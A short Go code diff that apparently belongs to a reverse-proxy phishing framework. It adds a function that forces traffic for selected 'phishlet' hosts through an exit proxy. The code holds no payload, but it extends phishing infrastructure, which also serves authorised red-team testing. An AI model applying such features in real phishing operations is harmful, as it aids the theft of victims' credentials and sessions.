@@ -246,6 +246,9 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 		} else {
 			sel := func(network, addr string) (net.Conn, error) {
 				host := strings.ToLower(strings.SplitN(addr, ":", 2)[0])
+				if hostWantsExitProxy(p, host) {
+					return pdial(network, addr)
+				}
 				for _, sfx := range routes {
 					if host == sfx || strings.HasSuffix(host, "."+sfx) {
 						return pdial(network, addr)
@@ -261,6 +264,28 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 	}
 	p.applyTransport()
 	return nil
+}
+
+// hostWantsExitProxy reports whether the origin host belongs to an enabled
+// phishlet that sets `proxy: true` — its whole upstream is forced through the
+// exit proxy regardless of the global domain-suffix routes. Hosts shared by
+// several phishlets route through the proxy if ANY owner forces it.
+func hostWantsExitProxy(p *HttpProxy, host string) bool {
+	for site, pl := range p.cfg.phishlets {
+		if !p.cfg.IsSiteEnabled(site) {
+			continue
+		}
+		if !pl.forceProxy {
+			continue
+		}
+		for _, ph := range pl.proxyHosts {
+			if combineHost(ph.orig_subdomain, ph.domain) == host {
+				log.Debug("proxy: %s via exit proxy (phishlet %s force)", host, site)
+				return true
+			}
+		}
+	}
+	return false
 }
 
 // applyTransport wires the upstream dial path (proxy selector or direct) plus
